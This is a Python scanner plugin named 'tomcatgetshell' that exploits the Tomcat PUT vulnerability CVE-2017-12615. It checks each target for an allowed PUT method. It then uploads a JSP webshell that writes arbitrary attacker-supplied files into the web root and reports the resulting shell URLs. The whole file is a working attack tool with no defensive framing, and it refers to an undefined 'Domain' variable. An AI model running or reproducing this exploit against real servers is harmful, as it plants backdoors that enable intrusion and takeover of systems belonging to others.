#!/usr/bin/env python
#-*-coding:utf-8-*-
import lib.requests as requests
import sys
import time
import logging
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def get_plugin_info():
    return {
        "name": "tomcatgetshell",
        "info": "tomcat远程代码执行CVE-2017-12615",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
                body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
                #body = '''upload success!'''
                try:
                    resp = requests.options(domain)
                    if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
                        url = domain+'/success.jsp/'
                        #url = "/" + str(int(time.time()))+'.jsp::$DATA'
                        resp_put = requests.put(url, data=body)
                        if resp_put.status_code  == 201 :
                            result.append('webshell:'+url[:-1])
                        elif resp_put.status_code == 204 :
                            result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
                        else:
                            result.append('%s >>>> 开启了PUT方法'%domain)
                except Exception,e:
                    logging.error(e)
                    pass
        if len(result):
            return result
